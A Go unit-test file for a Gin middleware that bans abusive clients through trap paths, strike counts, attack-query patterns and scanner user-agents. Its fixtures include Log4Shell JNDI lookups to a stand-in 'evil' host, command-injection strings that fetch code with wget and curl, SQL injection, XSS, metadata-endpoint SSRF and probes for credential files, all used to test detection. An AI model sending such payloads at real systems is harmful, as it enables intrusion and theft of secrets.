package middleware_test

// =============================================================================
// TEST CASE OVERVIEW
// =============================================================================
//
// File: banner_test.go
// Purpose: Verify the Banner middleware (bans abusive clients) and its default detection patterns.
// Type: Unit
//
// Test functions: 14
// Total scenarios: 15
//
// #   Test Case                                      Scenario                                                Expected Result
// 1   TestBanner_TrapPathBansAtOnce                  Client requests /.ENV.bak                               403 with Retry-After 60, client banned, other clients unaffected, alert sent
// 2   TestBanner_StrikesBanAtMaxStrikes              Three 404 responses (MaxStrikes 3)                      Strikes return 404, the next request gets 403
// 3   TestBanner_SuccessfulResponsesAreNotStrikes    Eleven 200 responses                                    Still 200, never banned
// 4   TestBanner_BanDurationEscalates                Second ban after the first expired                      Retry-After is 3600 (the next BanDuration)
// 5   TestBanner_IPv6ClientIsBannedByItsSlash64      IPv6 client hits a trap path                            Same /64 gets 403, another /64 gets 200
// 6   TestBanner_WhitelistedIPIsNeverBanned          Whitelisted IP hits a trap path                         Next request still 200
// 7   TestBanner_LimiterRejectionsCountAsStrikes     Five requests behind a 1 rps Limiter                    200, 429, 429, 429, then 403
// 8   TestDefaultTrapPaths_MatchProbesOnly           Known probe paths vs. normal app paths                  Every probe matches, no normal path matches
// 9   TestDefaultAttackPatterns_MatchAttacksOnly     Attack queries vs. normal queries                       Every attack matches, no normal query matches
// 10  TestDefaultScannerAgents_MatchScannersOnly     Scanner User-Agents vs. normal clients                  Every scanner matches, no normal client matches
// 11  TestBanner_BansScannerAgentAndAttackQuery      Scanner User-Agent (sqlmap)                             403
// 12  TestBanner_BansScannerAgentAndAttackQuery      URL-encoded Log4Shell query on an unmatched path        403
// 13  TestBanner_AttackQueryOnARealRouteIsNotBanned  Attack-like query on a real route, twice                200 both times
// 14  TestBanner_CrossSiteNoCORSNeverBansOrStrikes   Embedded cross-site no-cors requests to traps and 404s  404 each time, client not banned afterwards
// 15  TestBanner_EmptyListTurnsACheckOff             TrapPaths set to an empty list                          Trap path returns 404, no ban
//
// Benchmarks: 1
//   BenchmarkBanner_CleanRequest  Request to a real route with a normal query and browser User-Agent  Measures the per-request cost
//
// =============================================================================

import (
	"net/http"
	"net/http/httptest"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"go.uber.org/zap"

	"github.com/jun-develop/junkit/cache"
	"github.com/jun-develop/junkit/middleware"
)

// newBannerRouter returns a router with Banner and a GET /ok route, plus the fake notifier it alerts.
func newBannerRouter(opts middleware.BannerOptions) (*gin.Engine, *fakeNotifier) {
	gin.SetMode(gin.TestMode)
	notifier := newFakeNotifier()
	router := gin.New()
	router.Use(middleware.Banner(opts, zap.NewNop(), newResponder(), notifier))
	router.GET("/ok", func(c *gin.Context) { c.String(http.StatusOK, "ok") })

	return router, notifier
}

// baseBannerOptions bans after 3 strikes in a minute, for 1 minute and then 1 hour.
func baseBannerOptions() middleware.BannerOptions {
	return middleware.BannerOptions{
		Cache:        cache.NewMemory[int64](cache.MemoryOptions{}),
		MaxStrikes:   3,
		StrikeWindow: time.Minute,
		BanDurations: []time.Duration{time.Minute, time.Hour},
	}
}

// assertPattern checks that every string in match matches one of res (case-insensitively) and
// no string in skip does.
func assertPattern(t *testing.T, res []*regexp.Regexp, match, skip []string) {
	t.Helper()
	matches := func(s string) bool {
		return slices.ContainsFunc(res, func(re *regexp.Regexp) bool { return re.MatchString(strings.ToLower(s)) })
	}

	for _, s := range match {
		if !matches(s) {
			t.Errorf("%q not matched, want matched", s)
		}
	}

	for _, s := range skip {
		if matches(s) {
			t.Errorf("%q matched, want allowed", s)
		}
	}
}

func TestBanner_TrapPathBansAtOnce(t *testing.T) {
	router, notifier := newBannerRouter(baseBannerOptions())

	w := get(router, "/.ENV.bak", "203.0.113.1:1")
	if w.Code != http.StatusForbidden {
		t.Fatalf("trap request status = %d, want 403", w.Code)
	}

	if got := w.Header().Get("Retry-After"); got != "60" {
		t.Fatalf("trap request Retry-After = %q, want 60", got)
	}

	w = get(router, "/ok", "203.0.113.1:1")
	if w.Code != http.StatusForbidden {
		t.Fatalf("request after ban status = %d, want 403", w.Code)
	}

	if !strings.Contains(w.Body.String(), "suspicious activity") {
		t.Fatalf("request after ban body = %s, want the access_denied message", w.Body)
	}

	if w := get(router, "/ok", "203.0.113.2:1"); w.Code != http.StatusOK {
		t.Fatalf("another client status = %d, want 200", w.Code)
	}

	select {
	case msg := <-notifier.messages:
		if !strings.Contains(msg, "trap path") {
			t.Errorf("alert = %q, want it to name the reason (trap path)", msg)
		}
	case <-time.After(time.Second):
		t.Fatal("no alert was sent for the ban")
	}
}

func TestBanner_StrikesBanAtMaxStrikes(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())

	for i := range 3 {
		if w := get(router, "/missing", "203.0.113.1:1"); w.Code != http.StatusNotFound {
			t.Fatalf("strike %d status = %d, want 404 (the ban starts after the response)", i+1, w.Code)
		}
	}

	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusForbidden {
		t.Fatalf("request after 3 strikes status = %d, want 403", w.Code)
	}
}

func TestBanner_SuccessfulResponsesAreNotStrikes(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())

	for range 10 {
		get(router, "/ok", "203.0.113.1:1")
	}

	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
}

func TestBanner_BanDurationEscalates(t *testing.T) {
	opts := baseBannerOptions()
	router, _ := newBannerRouter(opts)

	get(router, "/.git/config", "203.0.113.1:1")
	if err := opts.Cache.Delete(t.Context(), "banner:ban:203.0.113.1"); err != nil {
		t.Fatalf("ending the first ban: Delete() error = %v", err)
	}

	if w := get(router, "/.git/config", "203.0.113.1:1"); w.Header().Get("Retry-After") != "3600" {
		t.Fatalf("second ban Retry-After = %q, want 3600", w.Header().Get("Retry-After"))
	}
}

func TestBanner_IPv6ClientIsBannedByItsSlash64(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())

	get(router, "/.env", "[2001:db8:1:2::1]:1")

	if w := get(router, "/ok", "[2001:db8:1:2::99]:1"); w.Code != http.StatusForbidden {
		t.Errorf("same /64 status = %d, want 403", w.Code)
	}

	if w := get(router, "/ok", "[2001:db8:1:3::1]:1"); w.Code != http.StatusOK {
		t.Errorf("another /64 status = %d, want 200", w.Code)
	}
}

func TestBanner_WhitelistedIPIsNeverBanned(t *testing.T) {
	opts := baseBannerOptions()
	opts.IPWhitelist = []string{"203.0.113.1"}
	router, _ := newBannerRouter(opts)

	get(router, "/.env", "203.0.113.1:1")

	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusOK {
		t.Errorf("whitelisted client status = %d, want 200", w.Code)
	}
}

func TestBanner_LimiterRejectionsCountAsStrikes(t *testing.T) {
	gin.SetMode(gin.TestMode)
	router := gin.New()
	router.Use(
		middleware.Banner(baseBannerOptions(), zap.NewNop(), newResponder(), nil),
		middleware.Limiter(baseLimiterOptions(), zap.NewNop(), newResponder(), nil),
	)
	router.GET("/ok", func(c *gin.Context) { c.String(http.StatusOK, "ok") })

	codes := make([]int, 5)
	for i := range codes {
		codes[i] = get(router, "/ok", "203.0.113.1:1").Code
	}

	if want := []int{200, 429, 429, 429, 403}; !slices.Equal(codes, want) {
		t.Fatalf("status codes = %v, want %v", codes, want)
	}
}

func TestDefaultTrapPaths_MatchProbesOnly(t *testing.T) {
	probes := []string{
		"/.env", "/.env.example", "/.ENV.local", "/api/.env", "/production.env", "/config/app.env.bak",
		"/.git/config", "/backend/.git/HEAD", "/.aws/credentials", "/.DS_Store", "/.htaccess", "/.npmrc",
		"/.vscode/sftp.json", "/root/.ssh/id_rsa", "/id_ed25519.pub",
		"/index.php", "/wp-login.php", "/admin/config.php7", "/default.aspx", "/login.do", "/db.sql",
		"/site.bak", "/backup.sqlite3", "/wp-admin/", "/blog/wp-content/x", "/phpmyadmin", "/pma/index",
		"/vendor/phpunit/phpunit/src", "/cgi-bin/luci", "/actuator/health", "/manager/html", "/owa/auth",
		"/+CSCOE+/logon.html", "/remote/login", "/_ignition/execute-solution", "/api/../../etc/passwd",
		"/WEB-INF/web.xml", "/..\\windows\\win.ini",
	}
	normalPaths := []string{
		"/", "/health", "/favicon.ico", "/robots.txt", "/api/v1/users", "/api/v1/users/0b6f3c3e-4c1a-4e5e-9f6a-1c2d3e4f5a6b",
		"/api/v1/environments", "/api/v1/settings.json", "/uploads/avatars/a.png", "/api/v1/pmax",
		"/.well-known/security.txt", "/api/v1/php-guides", "/api/v1/backup", "/api/v1/owners",
		"/api/v1/solrs", "/api/v1/docs/install.sh", "/api/v1/exports/report.zip",
	}

	assertPattern(t, middleware.DefaultTrapPaths, probes, normalPaths)
}

func TestDefaultAttackPatterns_MatchAttacksOnly(t *testing.T) {
	attacks := []string{
		"/api?x=${jndi:ldap://evil/a}", "/api?q=<script>alert(1)</script>", "/api?u=javascript:alert(1)",
		"/api?id=1 UNION ALL SELECT password FROM users", "/api?id=1+union+select+1", "/api?id=1/**/UNION/**/SELECT 1",
		"/api?id=1 AND SLEEP(5)", "/api?id=1;waitfor delay '0:0:5'", "/api?c=;wget http://x/s", "/api?c=$(curl x)",
		"/api?f=php://filter/resource=index", "/api?url=http://169.254.169.254/latest/meta-data", "/api?f=a\x00.png",
	}
	normalQueries := []string{
		"/api/v1/users?page=2&per_page=20", "/api/v1/search?q=union station", "/api/v1/search?q=select a plan",
		"/api/v1/search?q=sleep tips", "/api/v1/users?sort=-created_at", "/api/v1/posts?q=curl tutorial",
	}

	assertPattern(t, middleware.DefaultAttackPatterns, attacks, normalQueries)
}

func TestDefaultScannerAgents_MatchScannersOnly(t *testing.T) {
	scanners := []string{
		"sqlmap/1.7.2#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.1.6)", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
		"Fuzz Faster U Fool v2.1.0", "gobuster/3.6", "WPScan v3.8.25", "Mozilla/5.0 zgrab/0.x",
	}
	normalClients := []string{
		"", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
		"curl/8.4.0", "okhttp/4.12.0", "python-httpx/0.27.0", "Go-http-client/1.1", "PostmanRuntime/7.36.0",
		"Dart/3.2 (dart:io)",
	}

	assertPattern(t, middleware.DefaultScannerAgents, scanners, normalClients)
}

func TestBanner_BansScannerAgentAndAttackQuery(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())

	t.Run("scanner user agent", func(t *testing.T) {
		r := httptest.NewRequest(http.MethodGet, "/ok", nil)
		r.RemoteAddr = "203.0.113.1:1"
		r.Header.Set("User-Agent", "sqlmap/1.7")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, r)

		if w.Code != http.StatusForbidden {
			t.Errorf("scanner agent status = %d, want 403", w.Code)
		}
	})

	t.Run("url-encoded log4shell query on an unmatched path", func(t *testing.T) {
		// %24%7Bjndi: is ${jndi: encoded, as scanners send it.
		w := get(router, "/missing?x=%24%7Bjndi:ldap://evil/a%7D", "203.0.113.2:1")

		if w.Code != http.StatusForbidden {
			t.Errorf("encoded Log4Shell query status = %d, want 403", w.Code)
		}
	})
}

func TestBanner_AttackQueryOnARealRouteIsNotBanned(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())

	for range 2 {
		if w := get(router, "/ok?q=%3Cscript%3E", "203.0.113.1:1"); w.Code != http.StatusOK {
			t.Fatalf("attack-like query on a real route status = %d, want 200", w.Code)
		}
	}
}

func TestBanner_CrossSiteNoCORSNeverBansOrStrikes(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())
	embedded := func(path string) int {
		r := httptest.NewRequest(http.MethodGet, path, nil)
		r.RemoteAddr = "203.0.113.1:1"
		r.Header.Set("Sec-Fetch-Site", "cross-site")
		r.Header.Set("Sec-Fetch-Mode", "no-cors")
		w := httptest.NewRecorder()
		router.ServeHTTP(w, r)

		return w.Code
	}

	for _, path := range []string{"/.env", "/x?q=<script", "/missing", "/missing", "/missing", "/missing"} {
		if code := embedded(path); code != http.StatusNotFound {
			t.Fatalf("embedded %s status = %d, want 404", path, code)
		}
	}

	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusOK {
		t.Fatalf("visitor after embedded requests status = %d, want 200 (not banned)", w.Code)
	}
}

func TestBanner_EmptyListTurnsACheckOff(t *testing.T) {
	opts := baseBannerOptions()
	opts.TrapPaths = []*regexp.Regexp{}
	router, _ := newBannerRouter(opts)

	if w := get(router, "/.env", "203.0.113.1:1"); w.Code != http.StatusNotFound {
		t.Fatalf("trap path with empty TrapPaths status = %d, want 404", w.Code)
	}

	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusOK {
		t.Errorf("visitor after trap path status = %d, want 200 (not banned)", w.Code)
	}
}

func BenchmarkBanner_CleanRequest(b *testing.B) {
	router, _ := newBannerRouter(baseBannerOptions())
	r := httptest.NewRequest(http.MethodGet, "/ok?page=2&per_page=20&sort=-created_at&q=report", nil)
	r.RemoteAddr = "203.0.113.1:1"
	r.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15")

	for b.Loop() {
		w := httptest.NewRecorder()
		router.ServeHTTP(w, r)
		if w.Code != http.StatusOK {
			b.Fatalf("status = %d, want 200", w.Code)
		}
	}
}
